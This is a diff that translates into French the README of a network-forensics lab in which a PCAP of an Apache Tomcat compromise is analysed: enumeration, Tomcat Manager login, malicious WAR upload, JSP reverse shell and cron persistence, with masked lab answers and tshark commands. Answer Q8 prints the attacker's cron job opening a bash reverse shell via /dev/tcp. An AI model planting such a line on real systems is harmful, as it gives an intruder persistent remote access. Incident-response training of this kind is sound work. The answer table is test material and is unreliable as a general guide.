@@ -1,39 +1,39 @@
 # README — Tomcat Takeover Lab
 
-Status: completed  
-Type: PCAP analysis, network forensics, SOC, incident response
+Statut : terminé  
+Type : analyse PCAP, forensic réseau, SOC, réponse à incident
 
-## Lab objective
+## Objectif du lab
 
-The objective of this lab is to investigate an Apache Tomcat compromise using a PCAP file.
+L’objectif de ce lab est d’analyser une compromission d’un serveur Apache Tomcat à partir d’un fichier PCAP.
 
-The investigation identifies:
+L’analyse permet d’identifier :
 
-- the attacker IP address;
-- the exposed service;
-- the enumeration tool;
-- the discovered admin panel;
-- the valid credentials;
-- the malicious WAR file;
-- the JSP reverse shell;
-- the reverse shell connection;
-- the persistence mechanism installed on the compromised host.
+- l’adresse IP de l’attaquant ;
+- le service exposé ;
+- l’outil utilisé pour l’énumération ;
+- le panneau d’administration découvert ;
+- les identifiants valides ;
+- le fichier WAR malveillant uploadé ;
+- la JSP utilisée comme reverse shell ;
+- la connexion reverse shell ;
+- la persistance installée sur la machine compromise.
 
-## Incident summary
+## Résumé de l’incident
 
-The server `**********` exposes an Apache Tomcat service on port `****`.
+Le serveur `**********` expose un service Apache Tomcat sur le port `****`.
 
-The attacker `**********` first performs web browsing and directory enumeration. The User-Agent `************` appears in the HTTP requests, confirming that Gobuster was used to discover sensitive paths.
+L’attaquant `**********` effectue d’abord une navigation et une énumération web. Le User-Agent `************` apparaît dans les requêtes HTTP, ce qui confirme l’utilisation de Gobuster pour découvrir des chemins sensibles.
 
-The attacker discovers `/*******`, then accesses `/*******/html`. Several Basic Authentication attempts are observed. The valid credential pair is `*****:******`.
+L’attaquant découvre ensuite `/*******`, puis accède à `/*******/html`. Plusieurs tentatives d’authentification Basic sont observées. La combinaison valide identifiée est `*****:******`.
 
-After accessing Tomcat Manager, the attacker uploads `******.***`. This WAR deploys an application reachable at `/******/` and contains a malicious JSP named `********.***`.
+Une fois connecté au Tomcat Manager, l’attaquant upload le fichier `******.***`. Ce WAR déploie une application accessible via `/******/` et contient une JSP malveillante nommée `********.***`.
 
-The JSP starts a system shell and establishes an outbound connection to `**********:80`. In TCP stream `****`, the observed commands show that the attacker obtains `****`, moves to `/tmp`, and installs cron-based persistence to `**********:443`.
+La JSP lance un shell système et établit une connexion sortante vers `**********:80`. Dans le flux TCP `****`, les commandes observées montrent que l’attaquant obtient l’utilisateur `****`, se déplace dans `/tmp`, puis installe une persistance cron vers `**********:443`.
 
-## Final lab answers
+## Réponses finales du lab
 
-| Question | Answer |
+| Question | Réponse |
 |---|---|
 | Q1 | `**********` |
 | Q2 | `*****` |
@@ -44,27 +44,27 @@ The JSP starts a system shell and establishes an outbound connection to `*******
 | Q7 | `******.***` |
 | Q8 | `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'` |
 
-## Main commands used
+## Commandes principales utilisées
 
-### Extract HTTP requests
+### Extraire les requêtes HTTP
 
 ```bash
 tshark -r "web server.pcap" -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
 ```
 
-### Identify the WAR upload
+### Identifier l’upload WAR
 
 ```bash
 tshark -r "web server.pcap" -Y 'http.request.method == "POST" || http.request.uri contains "upload" || http.request.uri contains "******"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e http.file_data
 ```
 
-### Identify Basic Auth credentials
+### Identifier les identifiants Basic Auth
 
 ```bash
 tshark -r "web server.pcap" -Y 'http.authorization || http.authbasic || http.request.uri contains "/*******/html"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri -e http.authorization -e http.authbasic
 ```
 
-### Follow the reverse shell stream
+### Suivre le flux reverse shell
 
 ```bash
 tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
@@ -72,4 +72,4 @@ tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
 
 ## Conclusion
 
-The Tomcat server was compromised through Tomcat Manager. The attacker used valid credentials, uploaded a malicious WAR archive, triggered a JSP reverse shell, obtained `****` access, and installed cron-based persistence.
+Le serveur Tomcat a été compromis via le panneau Tomcat Manager. L’attaquant a utilisé des identifiants valides, uploadé une archive WAR malveillante, déclenché une JSP de reverse shell, obtenu un accès `****`, puis installé une persistance cron.
